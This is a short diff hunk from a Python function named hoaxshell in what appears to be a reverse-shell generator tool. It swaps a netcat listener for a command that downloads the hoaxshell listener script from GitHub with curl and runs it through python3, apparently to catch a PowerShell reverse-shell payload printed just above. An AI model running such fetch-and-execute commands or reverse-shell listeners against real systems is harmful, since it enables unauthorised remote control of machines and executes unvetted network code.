@@ -68,7 +68,7 @@ def hoaxshell():
 
             print(powershell_command)
 
-            command = f'nc -lvnp {PORT}'
+            command = f'python3 -c "$(curl -s https://raw.githubusercontent.com/t3l3machus/hoaxshell/main/revshells/hoaxshell-listener.py)" -t cmd-curl -p {PORT}'
             os.system(command)
                 
         if select == "4" or select == "3":
